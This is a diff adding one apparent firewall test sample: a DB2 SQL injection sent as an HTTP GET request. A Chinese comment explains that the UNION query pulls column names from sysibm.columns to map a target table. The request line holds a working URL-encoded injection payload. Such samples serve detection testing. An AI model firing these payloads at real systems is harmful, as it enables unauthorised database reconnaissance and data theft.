@@ -1,0 +1,9 @@
+# SQL注入_GET_db2_普通注入-06506479
+# 基于UNION查询，该语句尝试使用UNION注入方式，从sysibm.columns表中选择当前模式下名为'test'的表中的列名。通过获取特定表格的列名，攻击者可以了解目标数据库表的结构。这些信息可以帮助攻击者了解数据库中存储的数据类型和敏感信息，从而对数据进行进一步的利用或泄露。
+GET /?id=1%20union%20select%20column_name%20from%20sysibm.columns%20where%20table_schema=current%20schema%20and%20table_name=%27test%27&bid=hd_tag_m8mv26lc HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26lc
+RM-PRO-Token: 791b0ca94bbcf141bed0f62e81ba8d94
+RM-PRO-Time: 1742808631127
+User-Agent: curl/7.83.1
+
